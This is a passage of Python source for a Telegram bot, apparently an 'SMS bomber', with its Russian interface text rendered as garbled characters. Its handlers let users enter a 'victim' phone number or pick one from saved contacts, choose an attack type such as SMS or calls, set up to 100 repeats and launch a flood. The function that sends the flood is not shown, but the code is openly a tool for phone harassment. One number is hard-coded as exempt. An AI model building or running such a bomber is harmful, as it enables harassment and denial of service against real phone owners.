    username = message.from_user.username if message.from_user.username else "–ë–µ–∑ —é–∑–µ—Ä–Ω–µ–π–º–∞"

    users = load_contacts()
    user_id_str = str(user_id)

    if user_id_str not in users or "contacts" not in users[user_id_str]:
        await message.answer("–£ –≤–∞—Å –Ω–µ—Ç –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è.", reply_markup=kb.main)
        await state.clear()
        return

    contacts = users[user_id_str]["contacts"]
    contact_to_delete = next((c for c in contacts if c.get("contact_name", "").lower() == name_to_delete), None)

    if not contact_to_delete:
        await message.answer("–ö–æ–Ω—Ç–∞–∫—Ç —Å —Ç–∞–∫–∏–º –Ω–∞–∑–≤–∞–Ω–∏–µ–º –Ω–µ –Ω–∞–π–¥–µ–Ω. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –Ω–æ–≤–æ–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ '–ù–∞–∑–∞–¥ üîô'", reply_markup=get_add_contact_keyboard())
    else:
        phone = contact_to_delete.get("phone", "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –Ω–æ–º–µ—Ä")
        users[user_id_str]["contacts"] = [c for c in contacts if c.get("contact_name", "").lower() != name_to_delete]
        save_contacts(users)

        log_msg = f"üóë –ö–æ–Ω—Ç–∞–∫—Ç —É–¥–∞–ª—ë–Ω: {name_to_delete} ({phone}) –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º @{username} (ID: {user_id})"
        print(log_msg)
        logging.info(log_msg)

        await message.answer("–ö–æ–Ω—Ç–∞–∫—Ç —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –¥—Ä—É–≥–æ–≥–æ –∫–æ–Ω—Ç–∞–∫—Ç–∞ –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ '–ù–∞–∑–∞–¥ üîô'", reply_markup=get_add_contact_keyboard())
    # –°–æ—Å—Ç–æ—è–Ω–∏–µ –æ—Å—Ç–∞–µ—Ç—Å—è –¥–ª—è –æ–∂–∏–¥–∞–Ω–∏—è –Ω–æ–≤–æ–≥–æ –≤–≤–æ–¥–∞.

@router.callback_query(F.data == "delete_contacts_back")
async def delete_contacts_back(callback: CallbackQuery, state: FSMContext):
    """
    –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ "–ù–∞–∑–∞–¥" –∏–∑ —ç–∫—Ä–∞–Ω–∞ —É–¥–∞–ª–µ–Ω–∏—è –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤.
    –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —ç–∫—Ä–∞–Ω —Å –∫–æ–Ω—Ç–∞–∫—Ç–∞–º–∏.
    """
    user_id = callback.from_user.id
    contacts = get_user_contacts(user_id)
    contacts_text = "–í–∞—à–∏ –∫–æ–Ω—Ç–∞–∫—Ç—ã ‚òé"
    kb_buttons = get_contacts_buttons_keyboard(user_id, current_page=1, contacts=contacts)
    await callback.message.edit_text(contacts_text, reply_markup=kb_buttons)
    await callback.answer()

@router.callback_query(F.data == "contacts_back")
async def contacts_back(callback: CallbackQuery, state: FSMContext):
    """
    –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ "–ù–∞–∑–∞–¥" –Ω–∞ —ç–∫—Ä–∞–Ω–µ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤.
    –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é (–ø–æ—Å–ª–µ /start).
    """
    await state.clear()
    await callback.message.edit_text(text['greetings'], reply_markup=kb.main)
    await callback.answer()


# --- –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤ –≤ –±–æ–º–±–µ—Ä–µ ---


def get_bomber_number_keyboard(user_id: int) -> InlineKeyboardMarkup:
    """
    –ï—Å–ª–∏ —É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –µ—Å—Ç—å —Å–æ—Ö—Ä–∞–Ω—ë–Ω–Ω—ã–µ –∫–æ–Ω—Ç–∞–∫—Ç—ã, –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É —Å –∫–Ω–æ–ø–∫–∞–º–∏:
      - "–í–≤–µ—Å—Ç–∏ –Ω–æ–º–µ—Ä –≤—Ä—É—á–Ω—É—é üìù"
      - "–í—ã–±—Ä–∞—Ç—å –∏–∑ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤ ‚òé"
    –ï—Å–ª–∏ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤ –Ω–µ—Ç ‚Äì —Ç–æ–ª—å–∫–æ –≤–∞—Ä–∏–∞–Ω—Ç –≤–≤–æ–¥–∞ –≤—Ä—É—á–Ω—É—é.
    """
    contacts = get_user_contacts(user_id)
    buttons = []
    buttons.append(InlineKeyboardButton(text="–í–≤–µ—Å—Ç–∏ –Ω–æ–º–µ—Ä –≤—Ä—É—á–Ω—É—é üìù", callback_data="bomb_manual"))
    if contacts:
        buttons.append(InlineKeyboardButton(text="–í—ã–±—Ä–∞—Ç—å –∏–∑ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤ ‚òé", callback_data="bomb_choose_contact"))
    return InlineKeyboardMarkup(inline_keyboard=[buttons])

@router.callback_query(F.data == "startbomb")
async def start_bomber(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    user_id = callback.from_user.id
    if is_user_allowed(user_id):
        kb_bomber = get_bomber_number_keyboard(user_id)
        await callback.message.edit_text("–í—ã–±–µ—Ä–∏—Ç–µ —Å–ø–æ—Å–æ–± –≤–≤–æ–¥–∞ –Ω–æ–º–µ—Ä–∞ –∂–µ—Ä—Ç–≤—ã:", reply_markup=kb_bomber)
    else:
        user_id = callback.from_user.id
        username = callback.from_user.username
        chat_id = callback.message.chat.id if callback.message.chat else user_id
        await notify_admin_about_request(callback.message.bot, user_id, username)
        await callback.message.answer("üíî –ü—Ä–æ—Å—Ç–∏—Ç–µ, –Ω–æ –≤—ã –Ω–µ —è–≤–ª—è–µ—Ç–µ—Å—å –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç–µ–ª–µ–º –±–µ—Ç–∞-—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –Ω–∞—à–µ–≥–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è. –û–∂–∏–¥–∞–π—Ç–µ —Ä–µ–ª–∏–∑–∞.\n\n‚è≥ –í–∞—à –∑–∞–ø—Ä–æ—Å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º.")

@router.callback_query(F.data == "bomb_manual")
async def bomb_manual(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –∂–µ—Ä—Ç–≤—ã –±–µ–∑ –∑–Ω–∞–∫–∞ [+]:")
    await state.set_state(BomberState.waiting_number)
    await callback.answer()

@router.callback_query(F.data == "bomb_choose_contact")
async def bomb_choose_contact(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    contacts = get_user_contacts(user_id)
    if not contacts:
        await callback.answer("–£ –≤–∞—Å –Ω–µ—Ç —Å–æ—Ö—Ä–∞–Ω—ë–Ω–Ω—ã—Ö –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤.", show_alert=True)
        return
    buttons = []
    for idx, contact in enumerate(contacts):
        text = f"{contact.get('phone', '')} ‚Äî {contact.get('contact_name', '')}"
        buttons.append([InlineKeyboardButton(text=text, callback_data=f"bomb_contact_{idx}")])
    kb_contacts = InlineKeyboardMarkup(inline_keyboard=buttons)
    await callback.message.edit_text("–í—ã–±–µ—Ä–∏—Ç–µ –∫–æ–Ω—Ç–∞–∫—Ç –¥–ª—è –∞—Ç–∞–∫–∏:", reply_markup=kb_contacts)
    await callback.answer()

@router.callback_query(F.data.startswith("bomb_contact_"))
async def choose_bomb_contact(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    try:
        idx = int(callback.data.split("_")[-1])
    except ValueError:
        await callback.answer("–û—à–∏–±–∫–∞ –≤—ã–±–æ—Ä–∞ –∫–æ–Ω—Ç–∞–∫—Ç–∞.")
        return
    contacts = get_user_contacts(user_id)
    if idx >= len(contacts):
        await callback.answer("–ö–æ–Ω—Ç–∞–∫—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω.")
        return
    chosen_contact = contacts[idx]
    await state.update_data(number=chosen_contact.get("phone"))
    print(f"üì© –ü–æ–ª—É—á–µ–Ω –Ω–æ–º–µ—Ä –∏–∑ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤: {chosen_contact.get("phone")} | –ù–∞–∑–≤–∞–Ω–∏–µ –∫–æ–Ω—Ç–∞–∫—Ç–∞: {chosen_contact.get("contact_name")} | –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{callback.from_user.username} | ID: {callback.from_user.id} ")
    await callback.message.edit_text("–í—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø –∞—Ç–∞–∫–∏:", reply_markup=kb.attack_type)
    await state.set_state(BomberState.waiting_attack_type)
    await callback.answer()

@router.message(BomberState.waiting_number)
async def process_number(message: Message, state: FSMContext):
    print(f"üì© –ü–æ–ª—É—á–µ–Ω –Ω–æ–º–µ—Ä: {message.text} –æ—Ç {message.from_user.id}")
    try:
        if is_user_allowed(message.from_user.id):
            if message.text.isdigit() and message.text != '998903706877':
                await state.update_data(number=message.text)
                print(f"‚úÖ –ù–æ–º–µ—Ä {message.text} —Å–æ—Ö—Ä–∞–Ω—ë–Ω –≤ FSM")
                await message.answer("–í—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø –∞—Ç–∞–∫–∏:", reply_markup=kb.attack_type)
                await state.set_state(BomberState.waiting_attack_type)
                print("‚úÖ –ü–µ—Ä–µ—Ö–æ–¥ –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–µ: waiting_attack_type")
            else:
                await message.answer("üîí –í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –Ω–æ–º–µ—Ä, —Å–æ—Å—Ç–æ—è—â–∏–π —Ç–æ–ª—å–∫–æ –∏–∑ —Ü–∏—Ñ—Ä.")
                print("‚ùå –û—à–∏–±–∫–∞: –≤–≤–µ–¥—ë–Ω –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –Ω–æ–º–µ—Ä")
        else:
            user_id = message.from_user.id
            username = message.from_user.username
            chat_id = message.chat.id if message.chat else user_id
            await notify_admin_about_request(message.bot, user_id, username)
            await message.answer("üíî –ü—Ä–æ—Å—Ç–∏—Ç–µ, –Ω–æ –≤—ã –Ω–µ —è–≤–ª—è–µ—Ç–µ—Å—å –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç–µ–ª–µ–º –±–µ—Ç–∞-—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –Ω–∞—à–µ–≥–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è. –û–∂–∏–¥–∞–π—Ç–µ —Ä–µ–ª–∏–∑–∞.\n\n‚è≥ –í–∞—à –∑–∞–ø—Ä–æ—Å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º.")
            print(f"üö´ –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â—ë–Ω: –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{username} | ID: {user_id}")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –≤ process_number: {e}")


@router.callback_query(BomberState.waiting_attack_type)
async def process_attack_type(callback: CallbackQuery, state: FSMContext):
    """–í—ã–±–æ—Ä —Ç–∏–ø–∞ –∞—Ç–∞–∫–∏ (SMS, CALL –∏ —Ç. –¥.)."""
    print(f"üì© –í—ã–±—Ä–∞–Ω —Ç–∏–ø –∞—Ç–∞–∫–∏: {callback.data} –æ—Ç {callback.from_user.id}")  # –õ–æ–≥ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏
    
    try:
        await state.update_data(attack_type=callback.data)  # –°–æ—Ö—Ä–∞–Ω—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ FSM
        print(f"‚úÖ –¢–∏–ø –∞—Ç–∞–∫–∏ —Å–æ—Ö—Ä–∞–Ω—ë–Ω –≤ FSM: {callback.data}")  # –õ–æ–≥

        await callback.message.edit_text("–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–≤—Ç–æ—Ä–µ–Ω–∏–π (–¥–æ 100):")
        await state.set_state(BomberState.waiting_replay)  # –ü–µ—Ä–µ—Ö–æ–¥ –∫ —Å–ª–µ–¥—É—é—â–µ–º—É —Å–æ—Å—Ç–æ—è–Ω–∏—é
        print("‚úÖ –ü–µ—Ä–µ—Ö–æ–¥ –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–µ: waiting_replay")  # –õ–æ–≥

    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –≤ process_attack_type: {e}")  # –õ–æ–≥ –æ—à–∏–±–∫–∏



@router.message(BomberState.waiting_replay)
async def process_replay(message: Message, state: FSMContext):
    """–ü–æ–ª—É—á–µ–Ω–∏–µ —á–∏—Å–ª–∞ –ø–æ–≤—Ç–æ—Ä–µ–Ω–∏–π –∞—Ç–∞–∫–∏."""
    if message.text.isdigit():
        replay = int(message.text)
        if 1 <= replay <= 100:  # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º —á–∏—Å–ª–æ –ø–æ–≤—Ç–æ—Ä–æ–≤
            await state.update_data(replay=replay)

            await message.answer(f"–ë–æ–º–±–∞—Ä–¥–∏—Ä–æ–≤–∫–∞ –Ω–∞—á–Ω—ë—Ç—Å—è —Å {replay} –ø–æ–≤—Ç–æ—Ä–µ–Ω–∏—è–º–∏.\n–ó–∞–ø—É—Å—Ç–∏—Ç—å?", reply_markup=kb.start_stop_bomber)
            await state.set_state(BomberState.bombing)
        else:
            await message.answer("–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –æ—Ç 1 –¥–æ 100.")
    else:
        await message.answer("–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ —á–∏—Å–ª–æ –ø–æ–≤—Ç–æ—Ä–µ–Ω–∏–π.")


@router.callback_query(F.data == "start_attack", BomberState.bombing)
async def start_attack(callback: CallbackQuery, state: FSMContext):
    """
    –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∑–∞–ø—É—Å–∫–∞ –∞—Ç–∞–∫–∏.
    –ò–∑–≤–ª–µ–∫–∞–µ—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä—ã, —Å–±—Ä–∞—Å—ã–≤–∞–µ—Ç —Å—á—ë—Ç—á–∏–∫, —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç —Ñ–ª–∞–≥ —Ä—É—á–Ω–æ–π –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –≤ False,
    –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –∑–∞–ø—É—Å–∫–µ –∞—Ç–∞–∫–∏ –∏ –∑–∞–ø—É—Å–∫–∞–µ—Ç start_async_attacks.
    –ü–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è, –µ—Å–ª–∏ –∞—Ç–∞–∫–∞ –Ω–µ –±—ã–ª–∞ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –≤—Ä—É—á–Ω—É—é, –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è —Ñ–∏–Ω–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ.
    """
    data = await state.get_data()
    number = data.get("number")
    attack_type = data.get("attack_type")
    replay = data.get("replay")

    if not all([number, attack_type, replay]):
        await callback.message.answer("‚ùå –û—à–∏–±–∫–∞! –î–∞–Ω–Ω—ã–µ –¥–ª—è –∞—Ç–∞–∫–∏ –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç.")
        return

    user_id = callback.from_user.id
    username = callback.from_user.username or "–ù–µ—Ç username"

    # –°–±—Ä–∞—Å—ã–≤–∞–µ–º —Å—á—ë—Ç—á–∏–∫ –∏ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ñ–ª–∞–≥ —Ä—É—á–Ω–æ–π –æ—Å—Ç–∞–Ω–æ–≤–∫–∏
    await state.update_data(success_count=0)
    manual_stop_flags[user_id] = False

    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –∑–∞–ø—É—Å–∫–µ –∞—Ç–∞–∫–∏ –≤ –æ–¥–Ω—É —Å—Ç—Ä–æ–∫—É
    await callback.message.edit_text(
        f"üöÄ –ë–æ–º–±–∞—Ä–¥–∏—Ä–æ–≤–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞!\n\nüë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{username} (ID: {user_id})\nüìû –ù–æ–º–µ—Ä: {number}\n‚öôÔ∏è –¢–∏–ø: {attack_type}\nüîÅ –ü–æ–≤—Ç–æ—Ä—ã: {replay}\n‚ùó –ß—Ç–æ–±—ã –æ—Å—Ç–∞–Ω–æ–≤–∏—Ç—å, –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ.", reply_markup=kb.stop_bomber)

    await start_async_attacks(user_id, username, number, attack_type, replay, state)

    if manual_stop_flags.get(user_id, False):
        manual_stop_flags.pop(user_id, None)
        await state.clear()
        return

    final_data = await state.get_data()
    success_count = final_data.get("success_count", 0)
    await callback.message.answer(
        f"‚ù§ –ë–æ–º–±–∞—Ä–¥–∏—Ä–æ–≤–∫–∞ –æ–∫–æ–Ω—á–µ–Ω–∞! üíå –£—Å–ø–µ—à–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π: {success_count}",
        reply_markup=kb.main
    )
    await state.clear()

@router.callback_query(F.data == "stop_attack", BomberState.bombing)
async def stop_attack(callback: CallbackQuery, state: FSMContext):
    """
    –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –∞—Ç–∞–∫–∏.
    –í—ã–∑—ã–≤–∞–µ—Ç stop_attacks, —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç —Ñ–ª–∞–≥ —Ä—É—á–Ω–æ–π –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ.
    """
    user_id = callback.from_user.id
    await stop_attacks(user_id)
    manual_stop_flags[user_id] = True
    await callback.message.edit_text(f"üõë –ë–æ–º–±–∞—Ä–¥–∏—Ä–æ–≤–∫–∞ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞", reply_markup=kb.main)
    # –ù–µ –æ—á–∏—â–∞–µ–º state —Å—Ä–∞–∑—É, —á—Ç–æ–±—ã start_attack —Å–º–æ–≥ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —Ñ–ª–∞–≥